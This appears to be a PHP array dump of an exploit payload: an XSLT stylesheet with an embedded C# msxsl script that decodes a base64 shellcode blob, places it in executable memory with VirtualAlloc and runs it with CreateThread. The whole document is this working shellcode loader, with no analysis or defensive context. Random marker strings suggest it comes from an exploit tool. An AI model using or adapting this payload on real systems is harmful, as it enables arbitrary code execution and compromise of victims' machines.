array (
  'xml' => 'mFtASMEPd',
  'xslt' => '<?xml version=\'1.0\'?>
<xsl:stylesheet version="1.0"
xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
xmlns:msxsl="urn:schemas-microsoft-com:xslt"
xmlns:user="http://mycompany.com/mynamespace">
<msxsl:script language="C#" implements-prefix="user">
<![CDATA[

private static UInt32 MEM_COMMIT = 0x1000;
private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;

[System.Runtime.InteropServices.DllImport("kernel32")]
private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);

[System.Runtime.InteropServices.DllImport("kernel32")]
private static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId);

public string xml()
{
  string shellcode64 = @"Si9PQZJAkJCRTz/8kZOYQ9bWQZKWkpdO+EaTLz9Pk/k/Q/g3QJGRkkdCm0FHl5L4lvn5n5tLLydPP5gvT0mYT0OWn/hPkJtK9UP4m0mbP/z9SZfWSErWmE6bQEj5L5aRL5FJm0tJR5n8P5nWTz/5kZuY+EFAT5/4kfmYN/WQ/fVLSvXWT5eTRpOZR0NLT0f4Rp9IRvlBN5NP9UpKk/1ITvhKR0YvQPmTQUdIlkvWkP3W1kiQP5lGQNZC/UqfkzeTRkrW9SdOR5sv1pFOQ/VBSpaT1vyRRk6Sl0Y/mZj5kk/1/fmXQz8/n0lJRkOfl5AnSUNLmPX4Rk9PmflP+UpHL/2QN/ybJ5hLkPwv1vVJkJKSmUdImUCbmJnWJ5lL/PxLkpL9Sk78m05GmZFGSyeQkpf5/EiW/Ub4QfX4Spk3n/w/TkZOT/kvl5L9P/hDmTeYJ5gn9ZefRpEn1kCYSNZOm0lJQvmSlvWf/Uf1k0E3kJDW1v2ZSE+QSDf8T5iZR0NHQkZJTpv5+dZOSD9IS0ib/EE/m5k/SNaSQEtIkD/5mUaYSZ/1/Jg/Ly8vk5H8n0dGSZaXN5H1QT+TlpdJQSc/+Z/5SZP1P0/1Spmfl5knQ09IPy8vkDeSQDeTkvk3T0knkkNASpgvN5NCk0NCkptLkdZBR5dK1kmQT/k/+UNLR09GP06Zny9Pn0g3kEORR0qXSvVAQZifQPX1L0hHL0Yvm5NP1pBI1v3WSjebQZb1+fXWTvX1S0NKS59LTpGRP9ZGlzfW+JafT06YlkpIQtaQmEn5J/xG+Jj8n5NBRkH8kPVASpmbm0uXlvxHS5GfkU43S5CWlkNCmUv5k/VBny+TN/g3Rkb8kUZPk06TL5PWk0ov/C/5Q5lGS09HQy8nQTdO/UeR/ENPkU6XTpk3mTeSTvyRl5FGmEfWl0iTkUZHkU6TS0BA/UCfl/j1lzeb+JCf1kf4QvmY/Zv1TpBJ+JjWN5NP/JlD9UfWT5D1mT/1L04vkU9DLydAkpOZ1kf19ZdOmT/4R/n4T/2Zl58nmZdCQZBCmfX5S0pCkEiWlkr4P0GZP0+SQC+RmUFKJ071SUCSlpY3mNb1lj+b+P2QQkZHm0D4QktAQfz1SUj5SDdAmU4nR0ubQ0KQki9O/UBOSJtG+E5DkfWWQEeSm0ZOSZCWP5OXL5hGkJeRRkb9Tkr8Q0pGk0hAQkCY9ZmRSi+TP/X9+JNJSZKSmZaQSZdLkSc3Q/xPm5GfRkn5lv2f+C8vRpeTRvlG+UKRR0g/mfU3l0uf/JlK+fn4T0ZGP0+TQp83/TebkS+Tl5/WlieQmUBBm5+Ql5afkfmfSZmR+ENLSpYnL0+WmEuXQU5JkUpCkUlOJ0qbPzc3lv1J1k/WkpJOQfVH+Zv81kD9kpOb+U6f9ZBDn0P99ZBCTvVH+UH9Rp83JyeZT0KZ/U+fS5b9mydASP1Gk5cvm0lKSS+TJ5lLmP2XSidOlpJJJ9ZDJ5FJkk9DSkIvQJ839ZKfL0ZLmP0/m5+blv1ASZGTRtaXR5KYJ0OZSZZGSJL1SdZIRvxOSUKQ9UY3PzeRQZhK/E/5kfjWljf1+UFD9S+XQEuTRkKf1kE3+ZP8Rk78kSfWkkAnT5L8Rz+Zm0Mvkvk/SJdD+U79T0OWn/gnQZBC9Uf9QydOQfU3+Z/5R0FIm5aY+J9C+f2bN/UnSPX9QpGZkECYkJlBRp9JlvjWJ05A9ZI3k0g/P0eWL0uTmZdDNydDQkBOm/xIQv0nn/w/mZGfk0DWR0dKSD+TT05BST8v+EdAmTdPm0BPkUmT/daZ/PWbJ5aSlpGWQZKWmE74R0NCmSeXmUtKJ0BJ+EebQE9JmZv8P5ZGQ/hP1vhBL06Tl0iQTvj1/C/4+E75T5KRSC8/mJHWkkCTQEZIQpNKQ5uSkpiSS/j5RvX8kD9ON5c/SzfWQUb5kEqS1vnWRkJIQElLkZdBP/2WP5eWk0hDT0KW+T+Yl0FJ+UefRydJQUJAn0ZPQZuQ/D+XQ0FLP0AvN0qRQUr1Q/0vSEtGm0s/mf2Wm09LmJI3P0ZJRpv8k0b99U/49UORSidPk5Ynlv1OQpKZQUuYT/X9SEP4kplHk/U/R5tHQdY3+T9GSPWRJ/WWmT+SN5GfkUBDkU5H9ZBA/UKY+ZFDTkpORk/4/Zc3Rjf4P05I/fk3mZn8lieZQJH1Tv3WkEeWL04nQ/U3mSfW+ZKXSkNKl5BLQpCS1pL1mUhGl9ZI9Ub1mUObnycv/CdImEhJTp9PmU83N/xILy9K+JMnSS9KSPVHkJn5QvVIQ5HWQEMn9UBH+E+ZJ0BIJ0JJmU+YN0ibL5FJQ/mXQ/n5QZOQ9ZORkEaZk5JKkUOZSTeT/PjW9S/1+PxKQvxH/Zv11pFKSzdIkJZJkPhAS/xIQEj9SZL5TpAvL0D99ZdLm/w3L9ZC/CeWQD+YkUCYL0dG+JCZRv1J9UP8kpNIN0ubQEEvQJeTkEo3ny9Kl/31J0uY/U/4Qj+Wnz9H9Z+ZQ5mfS0ZLlvxKQdaRk5BHTpc3kDdISk9KkJ/5l09H+U4vljcv+EH5J/yZkkZBR/2RlkZL+ZZOTp/9+EtAk0hOnz/1LzeTlkeSP/2XkZ+fn0FOn0lI/JlBkUpJP5f5mU/9SJtPSz9B/EpOmy/5QiefP0hC+UObP5fWmZJJQkkvJ5aSQpH9/S/8+Z/9SJCRkU9CL/0vP0n9L0lLQNb8gcRU8v//X19QQVlMT0FEX18=";
  byte[] shellcode = System.Convert.FromBase64String(shellcode64);
  UInt32 funcAddr = VirtualAlloc(0, (UInt32)shellcode.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
  System.Runtime.InteropServices.Marshal.Copy(shellcode , 0, (IntPtr)(funcAddr), shellcode .Length);
  IntPtr hThread = IntPtr.Zero;
  IntPtr pinfo = IntPtr.Zero;
  UInt32 threadId = 0;
  hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);
  return "esdyF";
}
]]>
</msxsl:script>
<xsl:template match="/">
<xsl:value-of select="user:xml()"/>
</xsl:template>
</xsl:stylesheet>
',
)